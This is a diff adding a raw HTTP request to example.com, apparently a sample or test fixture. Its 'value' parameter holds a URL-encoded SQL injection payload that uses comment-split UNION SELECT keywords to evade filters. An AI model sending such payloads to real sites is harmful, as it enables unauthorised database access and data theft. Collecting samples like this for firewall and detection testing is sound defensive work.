@@ -1,0 +1,6 @@
+GET /index.php?value=%27%20CHAR%2897%2C110%2C100%29%201%3D0%20u/%2A%2146588%2A/nion%20sel/%2A%2A/ect%201%2C2%2C3%20--%253b%20SELECT%20NULL%2C%20NULL HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
